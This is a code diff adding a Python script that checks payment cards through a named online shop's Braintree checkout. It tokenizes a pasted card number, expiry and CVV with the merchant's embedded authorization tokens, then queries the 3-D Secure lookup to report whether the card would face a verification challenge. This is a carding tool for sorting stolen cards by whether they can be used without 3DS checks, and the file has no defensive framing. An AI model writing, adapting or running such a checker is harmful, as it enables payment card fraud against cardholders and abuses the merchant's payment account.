@@ -1,0 +1,150 @@
+import time
+import requests
+from fake_useragent import UserAgent
+import random
+import re
+from bs4 import BeautifulSoup
+import base64
+import asyncio
+
+def vbv(ccx):
+    ccx = ccx.strip()
+    n = ccx.split("|")[0]
+    mm = ccx.split("|")[1]
+    yy = ccx.split("|")[2]
+    cvc = ccx.split("|")[3]
+    headers = {
+    'authority': 'payments.braintree-api.com',
+    'accept': '*/*',
+    'accept-language': 'tr-TR,tr;q=0.9',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDIxNTUyNTMsImp0aSI6ImRhOWZmMDBkLWQxNDgtNDRkNC04NWU5LWY0MjY3NTU4ODkzMSIsInN1YiI6IjQ1dHg3Zmd5cjg5NnB3d3YiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjQ1dHg3Zmd5cjg5NnB3d3YiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.2DXGVbihKf4mZuCy4IpIRqPJnrCjdHcJCrrTuLgaQlkGCcMH9jqUJYATT_XWFG1IH5ggKkVRUTidgPJhbes-Sw',
+    'braintree-version': '2018-05-10',
+    'content-type': 'application/json',
+    'origin': 'https://assets.braintreegateway.com',
+    'referer': 'https://assets.braintreegateway.com/',
+    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
+}
+    
+    json_data = {
+    'clientSdkMetadata': {
+        'source': 'client',
+        'integration': 'custom',
+        'sessionId': '52d44aad-f641-48b3-8e71-b2e270f95740',
+    },
+    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+    'variables': {
+        'input': {
+            'creditCard': {
+                'number': cc,
+                'expirationMonth': mm,
+                'expirationYear': yy,
+                'cvv': cvc,
+            },
+            'options': {
+                'validate': False,
+            },
+        },
+    },
+    'operationName': 'TokenizeCreditCard',
+}
+
+    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+    try:
+        tok = response.json()['data']['tokenizeCreditCard']['token']
+    except:
+        return 'Error Card'
+    
+    headers = {
+    'authority': 'api.braintreegateway.com',
+    'accept': '*/*',
+    'accept-language': 'tr-TR,tr;q=0.9',
+    'content-type': 'application/json',
+    'origin': 'https://www.visionlinens.com',
+    'referer': 'https://www.visionlinens.com/',
+    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
+}
+    
+    json_data = {
+    'amount': '7.31',
+    'browserColorDepth': 24,
+    'browserJavaEnabled': False,
+    'browserJavascriptEnabled': True,
+    'browserLanguage': 'tr-TR',
+    'browserScreenHeight': 800,
+    'browserScreenWidth': 360,
+    'browserTimeZone': -180,
+    'deviceChannel': 'Browser',
+    'additionalInfo': {
+        'shippingGivenName': 'Alex',
+        'shippingSurname': 'Aancar',
+        'shippingPhone': '(202) 827-8399',
+        'ipAddress': '172.71.102.251',
+        'billingLine1': 'New york',
+        'billingLine2': '100 merkez',
+        'billingCity': 'New York',
+        'billingPostalCode': 'SW1W 0NY',
+        'billingCountryCode': 'GB',
+        'billingPhoneNumber': '(202) 827-8399',
+        'billingGivenName': 'Alex',
+        'billingSurname': 'Aancar',
+        'shippingLine1': 'New york',
+        'shippingLine2': '100 merkez',
+        'shippingCity': 'New York',
+        'shippingPostalCode': 'SW1W 0NY',
+        'shippingCountryCode': 'GB',
+    },
+    'challengeRequested': True,
+    'bin': '402766',
+    'dfReferenceId': '0_5fe8c603-0356-4cdb-a33f-df1051eb29c9',
+    'clientMetadata': {
+        'requestedThreeDSecureVersion': '2',
+        'sdkVersion': 'web/3.97.2',
+        'cardinalDeviceDataCollectionTimeElapsed': 37,
+        'issuerDeviceDataCollectionTimeElapsed': 16341,
+        'issuerDeviceDataCollectionResult': False,
+    },
+    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDIxNTU2NTAsImp0aSI6ImQ4YWQ0MTg3LWRiN2MtNDBlNy1iNjcwLWQxZGEwMTlhZTVmOCIsInN1YiI6IjQ1dHg3Zmd5cjg5NnB3d3YiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjQ1dHg3Zmd5cjg5NnB3d3YiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.UuuD6QUL64mVQ74SWBw4xngDiXHyj5B-wAYqbfLqVTCaRLmFlG3EgXarguACTN5sr02PMJrStUASHW8jyjzrYA',
+    'braintreeLibraryVersion': 'braintree/web/3.97.2',
+    '_meta': {
+        'merchantAppId': 'www.visionlinens.com',
+        'platform': 'web',
+        'sdkVersion': '3.97.2',
+        'source': 'client',
+        'integration': 'custom',
+        'integrationType': 'custom',
+        'sessionId': '15bdcacf-b52b-4cf3-8c17-41aee59bd96f',
+    },
+}
+
+    
+    response = requests.post(
+    f'https://api.braintreegateway.com/merchants/45tx7fgyr896pwwv/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
+    headers=headers,
+    json=json_data,
+)
+
+    time.sleep(1)
+    try:
+        vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
+    except KeyError:
+        return 'Unknown Error ⚠️'
+
+    if 'challenge_required' in vbv:
+        return '3DS Challenge Required ❌'
+    elif 'lookup_card_error' in vbv:
+        return 'lookup_card_error ⚠️'
+    elif 'lookup_error' in vbv:
+        return 'Unknown Error ⚠️'
+    return vbv
